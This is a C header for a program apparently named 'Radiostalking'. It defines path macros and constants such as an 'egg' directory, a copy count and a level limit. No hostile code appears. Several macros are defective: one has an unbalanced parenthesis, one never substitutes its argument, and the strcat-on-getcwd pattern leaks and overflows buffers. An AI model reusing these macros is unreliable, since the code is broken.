#ifndef PREPROCESSOR_H
#define PREPROCESSOR_H




#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "embeded.h"
#include "auxFuncs.h"
#include "fileCopier.h"
#include "broadcaster.h"




#define LINESIZE 1024

#define MAX_ARGV_SIZE 100

#define INITDIR (strcat(getcwd(0,LINESIZE),"/"))

#define EXECUTABLE_PATH (strcat(INITDIR,"Radiostalking.exe"))
				

#define RESOURCES_PATH (strcat(INITDIR,"resources/")

#define MESSAGE_PATH(cwd) (strcat(cwd,"me"))

#define TMP_FILE_PATH(cwd,num) (strcat(cwd,"tmp(num)"))

#define EGG_DIR_NAME "new/"
#define EGG_DIR_PATH(cwd) (strcat(cwd,EGG_DIR_NAME))
#define EGG_DIR_PATH_INC (strlen(EGG_DIR_NAME))

#define HOW_MANY_COPIES 3
#define MAX_LEVELS 10
#define SEC_IN_US 1000000

#endif
